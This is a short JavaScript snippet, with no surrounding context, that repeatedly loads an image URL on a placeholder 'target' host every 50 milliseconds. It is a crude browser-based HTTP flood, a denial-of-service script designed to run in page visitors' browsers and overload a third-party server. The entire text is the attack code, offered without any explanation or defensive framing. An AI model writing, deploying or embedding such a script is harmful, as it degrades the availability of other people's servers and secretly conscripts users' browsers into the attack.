function flood() {
    var img = new Image();
    img.src = 'http://target/page.html';
    img.onload;
}
var floodInterval = setInterval('flood()',50);
